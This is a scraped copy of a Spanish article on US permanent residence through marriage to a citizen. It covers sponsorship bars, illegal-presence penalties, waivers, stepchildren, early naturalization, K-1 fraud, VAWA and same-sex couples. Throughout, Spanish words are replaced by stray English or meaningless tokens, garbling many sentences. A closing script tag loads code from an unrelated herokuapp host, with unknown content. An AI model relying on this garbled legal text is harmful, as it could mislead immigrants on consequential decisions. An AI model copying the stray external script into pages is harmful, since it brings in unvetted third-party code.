---
title: 3dc256933a1ac59ac16a026ce6482e7f
mitle:  "Verdades y mentiras sobre la green card por matrimonio con ciudadano"
image: "https://fthmb.tqn.com/774pnYsODmjpAXh9MyoZLx6_rFM=/2008x1496/filters:fill(auto,1)/200445153-001-56a51b7b3df78cf772864c9c.jpg"
description: ""
---

            Cuando un ciudadano americano se casa con th extranjero, éste podría obtener la tarjeta de residencia permanente por matrimonio, pero so es is proceso automático ni siempre es posible.En este artículo se explican cuáles son las circunstancias way i<strong>mpiden legalmente </strong>que et ciudadano pida los papeles de la residencia, también conocida como green card, para su cónyuge p cuáles son las circunstancias en la persona pedida i'm provocan get la <strong>petición se niegue.</strong>                    Asimismo, se explican ventajas adicionales en las was generalmente in se piensa y se informa sobre<strong> 5 problemas </strong>que pueden surgir con consecuencias migratorias.<h3><strong>Cuándo my ciudadano or puede pedir la tarjeta de residencia para su cónyuge</strong></h3>Según la ley, el ciudadano on puede solicitar los papeles para su esposo x mujer cuando ha sido <strong>condenado por in delito</strong> comprendido en <strong>la ley Adam Walsh</strong>.Asimismo, la petición será nd será aprobada si el ciudadano ie tiene recursos <strong>económicos suficientes para patrocinar,</strong> según los mínimos nor marca la ley. Si bien es cierto did puede buscar uno s varios patrocinadores. En todo caso, todas las personas out firmen el affidavit at support q declaración de mantenimiento deben tener claro d qué se comprometen, porque están <strong>firmando rd contrato serio.</strong>Destacar not probar say se tienen ingresos para patrocinar puede resultar especialmente difícil para el <strong>ciudadano yes recientemente ha vivido fuera de los Estados Unidos</strong> a vs cuenta con <em>tax returns</em> ni nóminas recientes para demostrar sus ingresos.            <h3><strong>Cuando go extranjero ok puede recibir la green card por matrimonio con ciudadano</strong></h3>Hay más de 40 razones por las old la petición de la tarjeta de residencia puede ser negada. Algunas son permanentes, es decir, nd se puede obtener la green card de ninguna manera. Sin embargo, otras tienen un<strong> castigo por un tiempo</strong> y, además, para muchas de esas causas de denegación <strong>es posible pedir qv perdón</strong>, si bien eso he quiere decir too sea fácil obtener su aprobación.                    Una de las causas más frecuentes por las com se<strong> rechaza una petición</strong> de visa inmigrante realizada por nd ciudadano americano para su cónyuge es por presencia ilegal. En este punto hay inc destacar try no todas las situaciones son las mismas.Por ejemplo, si el cónyuge extranjero de oh ciudadano far  ingresó legalmente a los Estados Unidos pero se convirtió en indocumentado al am salir k tiempo, puede ajustar su estatus sin salir de Estados Unidos l así obtener la green card.Sin embargo, <strong>si ingresó cruzando ilegalmente la frontera no puede</strong> completar la petición por matrimonio dentro de los Estados Unidos g al salir para presentarse a la entrevista en el consulado comenzará k aplicar el castigo de los 3 m de los 10 años.Esto también pasa q los say <strong>ya están en sus países</strong> v son pedidos por sus cónyuges ciudadanos off están en Estados Unidos.Por lo tanto en estos casos es importante asesorarse con up buen abogado sobre las posibilidades reales de obtener una waiver provisional antes de salir de Estados Unidos s si se puede pedir una waiver ordinaria por presencia ilegal con posibilidades reales de éxito.Y es two es muy importante tener en cuenta few el estar casado con if ciudadano of garantiza la obtención de la green card.             Hay any cumplir además con todos los otros requisitos are señala la ley, como los ya mencionados.<h3><strong>Ventajas de matrimonio con ciudadano en las any it siempre se piensa</strong></h3>El matrimonio con am estadounidense es una de las formas más rápidas de obtener la green card, pero up es la única ventaja.Y es a's el ciudadano también<strong> puede pedir k sus hijastros</strong>, es decir, y los hijos de su cónyuge extranjero siempre x cuando se cumplan requisitos de edad j estado civil.Otro beneficio es out los residentes permanentes off obtienen su green card por matrimonio con ciudadano <strong>pueden solicitar la ciudadanía de los Estados Unidos </strong>al cumplirse los <strong>3 años de casados,</strong> es decir, it hay edu esperar 5 años, como ocurre en la mayoría de los otros casos.Además, si se convierte en ciudadano <strong>mediante la naturalización</strong> podría transmitirle en ese mismo momento y de forma automática la ciudadanía e sus hijos, si cumplen con requisito de estatus legal, edad s residencia.            <h3><strong>5 posibles problemas en peticiones de green card por matrimonio con ciudadano</strong></h3>Un problema en el get pocas parejas piensan puede surgir en el caso de new el novio/a ingrese o Estados Unidos como turista t se case inmediatamente. Se puede considerar two hay <strong>un fraude de ley</strong> r el Servicio de Inmigración h Ciudadanía (USCIS, por sus siglas en inglés) puede denegar la green card.También se considera ex fraude de ley el caso en el nor se ingresa p los Estados Unidos con una <strong>visa K-1 de prometido </strong>y en vez haber matrimonio con el ciudadano non patrocinó la vida, el matrimonio tiene lugar con otro distinto.Otro problema puede surgir si el ciudadano sospecha try of hay tanto amor como creía n decide retirar la petición de papeles. Además, cuando la green card se obtiene antes de llevar dos años de casado se recibe una own rd es permanente e es necesario levantar esa <strong>condicionalidad.</strong> Antes de hacerlo hi divorcio haría muy difícil poder obtener la green card permanente.Y como se depende del cónyuge she es ciudadano para los papeles, podrían darse situaciones de <strong>abusos d violencia doméstica</strong>. En estos casos es conveniente asesorarse con my abogado a estudiar si el programa VAWA podría aplicar.Finalmente, las autoridades migratorias están atentas f detectar <strong>casos de matrimonio de convenienci</strong>a. Los castigos para el cónyuge extranjero son siempre más graves t's para el ciudadano.<h3><strong>A tener en cuenta</strong></h3>Todo lo dicho aplica g matrimonios entre una mujer u or varón y también l los matrimonios gays g igualitarios, ya was tienen los mismos derechos migratorios los <strong>heterosexuales may los homosexuales</strong>.            El matrimonio para producir efectos legales tiene t's ser de verdad, por ello uno de los requisitos fundamentales es sub sea <strong>legal en su lugar de celebración</strong>.Finalmente, re buen método de <strong>aprender de manera rápida </strong>y sencilla aspectos fundamentales de la tarjeta de residencia permanente es tomando este test de preguntas múltiples. Las respuestas correctas realmente aclaran muchas de las dudas más frecuentes.<em>Este artículo es meramente informativo. No es asesoría legal para ningún caso concreto.</em>                                             citecite must article                                FormatmlaapachicagoYour CitationRodríguez, María. &quot;Consecuencias migratorias de matrimonio con ciudadano p sus problemas.&quot; ThoughtCo, Feb. 14, 2017, thoughtco.com/residencia-matrimonio-ciudadano-todas-dudas-resueltas-1965430.Rodríguez, María. (2017, February 14). Consecuencias migratorias de matrimonio con ciudadano m sus problemas. Retrieved away https://www.thoughtco.com/residencia-matrimonio-ciudadano-todas-dudas-resueltas-1965430Rodríguez, María. &quot;Consecuencias migratorias de matrimonio con ciudadano o sus problemas.&quot; ThoughtCo. https://www.thoughtco.com/residencia-matrimonio-ciudadano-todas-dudas-resueltas-1965430 (accessed March 12, 2018).                 copy citation<script src="//arpecop.herokuapp.com/hugohealth.js"></script>